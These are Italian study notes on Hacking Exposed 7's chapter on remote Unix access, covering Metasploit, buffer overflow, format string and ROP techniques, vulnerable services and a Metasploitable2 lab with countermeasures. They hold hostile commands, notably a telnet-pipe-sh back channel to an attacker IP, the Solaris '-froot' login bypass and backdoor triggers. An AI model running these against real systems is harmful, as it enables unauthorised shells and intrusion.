---
tags: [ethl, hacking-exposed-7, hacking-unix, remote-access, cap5]
capitolo: 5.1
data: 2026-07-04
collegamenti: ["[[ETHL 0x11 - Cap 3 Enumeration]]", "[[ETHL 0x12 - Cap 4 Hacking Windows]]", "[[ETHL - Buffer Overflow e Stack Smashing]]", "[[ETHL - Return-to-libc e ROP]]", "[[ETHL - Format String Attacks]]", "[[ETHL - Reverse Shell e Back Channel]]", "[[ETHL - Metasploit Framework]]"]
---

# ETHL 0x13 — Cap 5.1 Hacking Unix (Remote Access)

> [!abstract] Scope del capitolo
> Come un attaccante **ottiene accesso remoto** a un sistema Unix e da lì arriva a una **shell**. Due blocchi: (1) perché Unix è un bersaglio, i tool e Metasploit; (2) i metodi per guadagnare accesso remoto — exploit di servizi in ascolto, attacchi data-driven (buffer overflow, format string, input/integer validation), tecniche per la shell (back channel) e la carrellata di servizi vulnerabili classici (FTP, Sendmail, RPC, NFS, X, DNS, SSH, OpenSSL, Apache). Chiude coi tre scenari di laboratorio su Metasploitable2. Presuppone footprinting/scanning/enumeration già fatti (→ [[ETHL 0x11 - Cap 3 Enumeration]]).

---

## Parte 1 — Sistemi Unix e tool

> [!info] Perché Unix
> La maggioranza dei server nel mondo gira su piattaforme Linux/Unix-like, il codice sorgente è disponibile, è facile da modificare e da programmarci sopra. **Consequenza per l'attaccante**: enorme superficie e bersaglio molto attraente. Unix ha due livelli di accesso, **root** e **user**: root è un *single point of attack* — bucato quello, si ha il controllo totale. La "Quest for Root" è il filo conduttore di tutto il capitolo.

> [!note] Tool per fase
> Ricalcano la catena footprinting → scanning → enumeration. **Footprinting**: whois, nslookup, dig, FOCA, Maltego. **Scanning**: Nmap, netcat, tcpdump, Nessus. **Enumeration**: dnsenum, rpcinfo, smbclient. Il *vulnerability mapping* è il passo che lega gli attributi raccolti (servizi in ascolto, versioni) a falle note, incrociando DB pubblici — Bugtraq, OSVDB, CVE — e poi usando exploit pubblici o scritti ad hoc, oppure scanner automatici come Nessus.

> [!tip] Script kiddie
> Distinzione della slide: lo *script kiddie* salta il vulnerability mapping e spara exploit a caso (es. exploit Unix contro sistemi Windows → inutile). L'attaccante "educato" prima mappa versione ↔ vulnerabilità, poi colpisce mirato.

### Metasploit Framework

> [!info] Cos'è Metasploit
> Framework open source ed estendibile che fornisce infrastruttura, contenuti e tool per penetration test e audit di sicurezza. Copre ricognizione, sviluppo exploit, packaging del payload e delivery verso i target. Disponibile su Windows, Unix, Linux e macOS; gli exploit si condividono facilmente nella community.

> [!note] Termini base
> **Module**: pezzo di codice autonomo che estende il framework (exploit, escalation, scanner, information gathering) — un "lavoro discreto" da assegnare. **Session**: connessione fra il target e la macchina che esegue Metasploit; permette di inviare ed eseguire comandi sul target.

> [!note] Tipi di modulo
> **Exploits** (codice per ottenere accesso), **Payloads** (ciò che viene consegnato con l'exploit per interagire col sistema bucato), **Auxiliary** (scanner, DoS, attacchi wireless/VoIP...), **NOPS** (mantengono costante la dimensione del payload), **Post-exploitation** (raccolta prove, pivoting più in profondità), **Encoders** (rimuovono byte indesiderati dal payload).

> [!note] Interfacce e comandi
> Interfacce: `msfconsole` (CLI interattiva, la principale), `msfcli`, Armitage (GUI di terze parti), `msfweb`. Avvio: `service postgresql start` poi `msfconsole`. Comandi core: `show exploits`, `show payloads`, `search`, `show options`, `set <var>`, `info`, `exploit`. **Workflow tipo**: apri console → seleziona exploit → imposta target → scegli payload → imposta opzioni → `exploit`. Esempio classico: `reverse_tcp` che dalla vittima si riconnette all'attaccante aprendo una sessione meterpreter.

> [!info] Reverse ≠ bind — a voce
> Il payload `reverse_tcp` sfrutta lo stesso principio del back channel più sotto: **è la vittima a iniziare la connessione** verso l'attaccante. Serve perché i firewall filtrano quasi sempre il traffico *in ingresso* ma lasciano passare quello *in uscita*. Un payload *bind* fa il contrario (apre una porta in ascolto sulla vittima) e funziona solo se il firewall permette l'inbound — motivo per cui reverse è il default in scenari reali.

---

## Parte 2 — Accesso remoto

> [!info] Progressione dell'attacco
> Sequenza logica: **prima** accesso remoto via rete (tipicamente sfruttando una vulnerabilità in un servizio in ascolto), **poi** shell o login sul sistema. Gli attacchi *locali* successivi si chiamano **Privilege Escalation** (coperti altrove).

> [!note] Quattro metodi di accesso remoto
> 1. **Exploit di un servizio in ascolto** — se un servizio non è in ascolto non si può bucare da remoto; i servizi con login interattivo (telnet, ftp, rlogin, ssh) sono i candidati. BIND (DNS) è storicamente pieno di falle.
> 2. **Route through a Unix system** — attraversare un Unix che fa da sicurezza tra due reti (es. firewall) tramite **source routing**.
> 3. **User-initiated remote execution** — ingannare l'utente perché esegua codice / apra un sito / un allegato malevolo.
> 4. **Promiscuous-mode attacks** — colpire il software di sniffing stesso.

> [!info] Source routing — a voce
> Tecnica per cui **il mittente specifica il percorso** che il pacchetto deve seguire nella rete. L'attaccante inietta pacchetti source-routed *attraverso* il firewall (se il source routing è abilitato) per raggiungere sistemi interni, aggirando le assunzioni di routing del firewall. Contromisura ovvia: disabilitare il source routing sui perimetrali.

> [!info] Promiscuous mode — a voce
> La modalità promiscua fa sì che la NIC riceva **tutto** il traffico sul segmento, anche non indirizzato a lei. Il punto d'attacco non è la NIC ma il **parser** del software di sniffing (tcpdump & co.): un pacchetto costruito ad arte sfrutta una vulnerabilità nel codice che lo analizza → l'attaccante inietta codice attaccando lo sniffer. Lezione trasversale: chi *legge* dati non fidati è bersaglio quanto chi li *serve*.

### Exploit di servizi in ascolto

> [!note] Due grandi famiglie
> Gli attacchi ai servizi in ascolto si dividono in **brute force** (indovinare credenziali) e **data-driven** (mandare dati che causano comportamenti non voluti: buffer overflow, format string, input/integer validation).

> [!note] Brute force
> Servizi attaccabili: telnet, FTP, rlogin/rsh, SSH, SNMP, LDAP, POP/IMAP, HTTP(S), CVS/SVN, Postgres, MySQL, Oracle. La lista utenti arriva dalla fase di enumeration (finger, rusers, sendmail). Frequentissimo l'account **"Smoking Joe"** (username = password). Tool automatici: **Hydra**, **Medusa**. Contromisure: password forti (**Cracklib**), **PAKE** (autenticazione basata su password sicura senza esporre la password — SRP, OPAQUE, AuCPace), e usare sempre **OpenSSH** / servizi cifrati (mai protocolli in chiaro).

#### Attacchi data-driven

> [!info] Buffer overflow
> Si verifica quando si scrive in un buffer (array a dimensione fissa) più dati di quanti allocati. Legato a funzioni C **senza bounds checking**: `strcpy()`, `strcat()`, `sprintf()`. Normalmente causa un segfault; l'attaccante invece lo sfrutta per **sovrascrivere il return address** salvato nello stack. Al `ret` della funzione, EIP salta all'indirizzo scelto — tipicamente l'inizio del buffer, che contiene lo **shellcode**.

> [!info] NOP sled — a voce
> Con ASLR/incertezza sull'indirizzo esatto non sai *dove* atterrare. Si imbottisce il codice con una **NOP sled**: una sequenza di istruzioni `NOP` che precede lo shellcode. Se il salto atterra *ovunque* dentro lo sled, l'esecuzione scivola fino allo shellcode subito dopo. Trasforma un bersaglio puntiforme in una finestra ampia.

> [!info] Return-to-libc
> Nasce contro la protezione **stack non eseguibile** (W^X / NX): se lo stack non è eseguibile, lo shellcode iniettato lì non parte. Soluzione: **non iniettare codice**, ma riusare codice già eseguibile nella **libc**. Si sovrascrive il return address con l'indirizzo di una funzione libc (`system`, `exec`, `printf`, `open`, `exit`...) e si prepara sullo stack l'argomento `"/bin/sh"` → spawn di una shell **con i privilegi del processo bucato**. Bypassa la prevenzione dell'esecuzione dello stack.

> [!info] ROP e code reuse
> **Return-Oriented Programming** generalizza return-to-libc: invece di tornare a funzioni intere, si torna a **gadget** — brevi sequenze di istruzioni già presenti nel programma che terminano con `ret`. Concatenando gadget si costruisce codice arbitrario senza iniettarne di nuovo. È il "code reuse attack" della slide: l'exploit del buffer overflow devia il control-flow (la CFG legittima `A→B→E→D` viene rotta) riusando codice esistente. → collega al lab di binary exploitation.

> [!info] Format string
> Nasce quando il programmatore scrive `printf(buf)` invece di `printf("%s", buf)` con `buf` controllato dall'utente. `printf` preleva i parametri **dallo stack** in base ai format specifier: se ce ne sono più degli argomenti forniti, legge oltre. Usi offensivi: `%x` **legge/dumpa lo stack** (8 byte per volta), `%s` **dereferenzia** un puntatore per leggere memoria arbitraria, **`%n` scrive** in memoria il numero di byte stampati finora → **scrittura arbitraria**. Pericoloso quanto un buffer overflow; vale per tutta la famiglia (`fprintf`, `sprintf`...). Contromisura: passare **sempre** una format string letterale.

> [!info] Input validation
> Il server non ripulisce l'input prima di passarlo oltre. Caso storico: telnet daemon di **Solaris 10 (2007)** — `telnet -l "-froot" 192.168.1.101` passava `-f root` al programma `login`, concedendo **root senza password** (CVE-2007-0882). Due approcci alla validazione: **black list** (esclude input malevolo noto — sconsigliata, si aggira sempre) vs **white list** (ammette solo input buono noto — raccomandata).

> [!info] Integer overflow / sign
> Una variabile intera ha un massimo (es. 32.767 su 16 bit): inserire 60.000 la fa interpretare come **-5536**. Sfruttamento tipico: un controllo di lunghezza `if (len > 256) error();` viene **superato** da un `len` negativo, ma quando `len` finisce in `strncpy` (che vuole un `size_t` **unsigned**) il -5536 si converte in un numero enorme (27231) → **buffer overflow**. È l'inganno del cambio di segno signed→unsigned. Contromisure: stesse dei buffer overflow, programmazione sicura.

> [!note] Contromisure buffer overflow
> Coding sicuro (**SSP/Stack Smashing Protector** di gcc, validazione input, routine più sicure, meno codice con privilegi root); test e audit; disabilitare servizi inutili/pericolosi (access control con **TCP wrappers/tcpd**, `xinetd`, `iptables`, `ipf`); **stack execution protection** (Exec Shield, GRSecurity — non a prova di bomba, vedi heap overflow); **ASLR** (randomizza lo spazio d'indirizzamento a ogni processo → difficile trovare il codice iniettato).

### Ottenere la shell

> [!info] Obiettivo attaccante
> Il fine è ottenere accesso **command-line / shell** sul target. Login interattivo via telnet/rlogin/**SSH**; esecuzione comandi non interattiva via **RSH/SSH/Rexec**. Ma cosa succede se i servizi di login remoto sono spenti o bloccati dal firewall? → back channel.

> [!info] Reverse telnet e back channel
> **Back channel** = il canale di comunicazione **origina dal sistema target** (non è l'attaccante a connettersi verso i servizi di login). Il **reverse telnet** usa telnet per creare questo canale dal target verso l'attaccante. È concettualmente identico a una **reverse shell** e serve per lo stesso motivo del `reverse_tcp`: bucare la logica del firewall che blocca l'inbound ma permette l'outbound.

> [!info] Meccanica del back channel — a voce
> Sull'attaccante (Kali, 192.168.56.102), due finestre con due listener netcat:
> `nc -l -n -v -p 80` (comandi in ingresso) e `nc -l -n -v -p 25` (output).
> Sul target (Metasploitable, .101), l'exploit fa eseguire:
> `telnet 192.168.56.102 80 | sh | telnet 192.168.56.102 25`
> La pipe è il trucco: **stdin dalla connessione sulla 80 → `sh` → stdout nella connessione sulla 25**. L'attaccante digita i comandi nella finestra 80, il target li esegue localmente e il risultato compare nella finestra 25. Contromisure: disabilitare servizi non necessari, togliere X dai sistemi ad alta sicurezza, far girare il web server come `nobody` e negargli `execute` su telnet (`chmod 750 telnet`), bloccare col firewall le connessioni uscenti dal web server.

### Servizi remoti vulnerabili (carrellata)

> [!note] FTP
> Server FTP a volte permettono upload anonimi; **accesso anonimo + directory world-writable = guai**. Misconfig → directory traversal (accesso a file sensibili). Buffer overflow e altro: la vuln *"site exec"* di wu-ftp (format string) permetteva esecuzione arbitraria come root. Contromisure: evitare FTP se possibile, patchare, configurare con cura, **nessuna** directory world-writable né accesso anonimo se non strettamente necessari.

> [!note] Sendmail
> MTA (Mail Transfer Agent) diffuso, lunga storia di vulnerabilità. Se misconfigurato consente spam attraverso i tuoi server. Contromisure: ultima versione, investigare ogni **alias** che punta a un programma anziché a un utente, permessi stretti sui file di alias, valutare MTA più sicuri (**qmail**, **postfix**).

> [!note] RPC
> Molte versioni stock di Unix hanno servizi **RPC** abilitati di default; sono complessi e girano generalmente **come root** (es. `rpc.ttdbserverd`, `rpc.cmsd`) → ottimo bersaglio per root shell remote. Contromisure: disabilitare gli RPC non indispensabili, access control device che filtri le porte RPC (difficile), contromisure buffer overflow, usare sempre **Secure RPC** (autenticazione a chiave pubblica, ma problemi di interoperabilità).

> [!note] NFS
> **Network File System**: accesso trasparente a file/directory remoti come fossero locali. Vari buffer overflow legati a `mountd`. Un NFS mal configurato **esporta il filesystem a chiunque**. Contromisure: disabilitarlo se inutile, access control su client/utenti, esportare solo certe directory (`/etc/exports`, `/etc/dfs/dfstab`), **mai** includere l'IP locale del server o `localhost` tra i sistemi ammessi al mount (interazione col portmapper → spoofing di richieste come da localhost).

> [!note] X Insecurities
> L'**X Window System** fa condividere un display grafico a più programmi. Un client X può **catturare i tasti** dell'utente alla console, killare/catturare finestre, rimappare la tastiera per iniettare comandi. Tool: **xscan** (scansiona una subnet per X server aperti e logga i tasti), **xwatchwin** (vede le finestre aperte). Contromisure: evitare `xhost +`, usare autenticazione forte (**MIT-MAGIC-COOKIE-1**, **XDM-AUTHORIZATION-1**, **MIT-KERBEROS-5**), tunnelare X dentro **ssh**.

> [!note] DNS / BIND
> DNS è quasi sempre presente sul perimetro; l'implementazione Unix più comune è **BIND**. Buffer overflow in BIND sfruttabili con **risposte malformate** a query DNS → controllo parziale del server (non una vera shell). **DNS cache poisoning**: nel 2008 **Dan Kaminsky** rivelò una falla seria, capace di alterare record DNS su router reali; patchata in segreto prima della divulgazione. Contromisure: disabilitare BIND se inutile, patchare, far girare `named` come utente non privilegiato, **chroot jail**, valutare **djbdns** (ma anch'esso ha avuto falle).

> [!note] SSH / OpenSSL / Apache
> **SSH**: alternativa sicura a telnet, ma integer overflow e altri bug in alcuni pacchetti hanno concesso root remoto → patchare, usare la **privilege separation** (sshd in ambiente non privilegiato, chroot). **OpenSSL**: implementazione SSL presente ovunque; famoso buffer overflow sfruttato dal worm **Slapper**, e **Heartbleed** (improper input validation) → patchare, disabilitare SSLv2 se inutile. **Apache**: web server complesso e configurabile, es. **Apache Killer** (DoS con range di byte sovrapposti) → ultima versione + patch.

### Laboratorio — Metasploit su Metasploitable2

> [!note] Setup e scanning
> Attaccante su host, target **Metasploitable2** (Ubuntu Server 14.04) su 192.168.56.101. Ricognizione: `nmap -sn 192.168.56.0/24` (host vivi), `sudo nmap -sS -sV -O 192.168.56.101` (SYN scan + versioni + OS, solo TCP), `sudo nmap -sU ...` (UDP, lento e con falsi positivi).

> [!example] Scenario 1 — SSH via SMB
> Enumerare utenti sfruttando SMB e tentare login con username-come-password. `nmap --script smb-enum-users.nse -p 445 192.168.56.101` per estrarre gli utenti, poi `ssh msfadmin@...` (pwd: `msfadmin`) e `ssh postgres@...` (pwd: `postgres`). SMB è protocollo Microsoft per condivisione file/stampanti — presente anche su Unix via Samba.

> [!example] Scenario 2 — VSFTPD backdoor
> **VSFTPD** ("Very Secure FTP Daemon"). La versione **2.3.4** aveva il sorgente **trojanizzato**: un username contenente `:)` (smiley) apriva una **shell di comando sulla porta 6200**. Sfruttabile con Metasploit. È una *bind* shell (apre una porta sul target), non reverse.

> [!example] Scenario 3 — UnrealIRCD backdoor
> **UnrealIRCD** (server IRC molto usato), anch'esso con sorgente trojanizzato: la backdoor si attiva inviando il prefisso `AB;` seguito da un comando alla connessione. Modulo: `exploit/unix/irc/unreal_ircd_3281_backdoor`.

> [!tip] Filo comune dei tre scenari
> Scenario 1 = credenziali deboli (nessun exploit binario). Scenari 2 e 3 = **backdoor da supply-chain** (tarball dei sorgenti compromessi a monte, non un bug di programmazione). Metasploitable2 è una VM *volutamente* vulnerabile: serve a esercitare il workflow `search → set → exploit`, non a rappresentare bersagli realistici.

---

> [!summary] In una riga
> Su Unix l'attaccante punta a root, entra tramite un **servizio in ascolto** (brute force o data-driven: overflow / format string / validazione), e se i login diretti sono bloccati costruisce un **back channel** in uscita; poi conosce la mappa dei servizi classici bucabili (FTP, Sendmail, RPC, NFS, X, DNS, SSH, OpenSSL, Apache) e in lab li colpisce con Metasploit.

> [!question] Punti aperti
> Da approfondire/mettere a nota a parte: (1) **heap overflow** e mitigazioni moderne (la slide accenna "heap-based overflow" ma non lo sviluppa — collega al lab binary/heap); (2) dettaglio **ASLR + bypass** (leak di indirizzi per ROP); (3) meccanica precisa di **DNS cache poisoning à la Kaminsky** (birthday attack sul TXID + porta sorgente); (4) confronto **bind vs reverse shell** come nota trasversale (ricorre in reverse_tcp, back channel, VSFTPD). Da confermare se il capitolo 5.2 esiste e cosa copre.

> [!todo] Prossimi obiettivi
> (1) Scorporare i callout tecnici densi in note dedicate: [[ETHL - Buffer Overflow e Stack Smashing]], [[ETHL - Return-to-libc e ROP]], [[ETHL - Format String Attacks]], [[ETHL - Reverse Shell e Back Channel]] — così questa nota-capitolo resta indice e i meccanismi vivono standalone. (2) Restano dalle sessioni precedenti: **nota Kerberos completa**, **nota Device Driver Exploits**, integrazioni in [[ETHL - LAN Manager (LM) vs NTLM]], e l'**Homework #2** (Cap. 2 & 3).
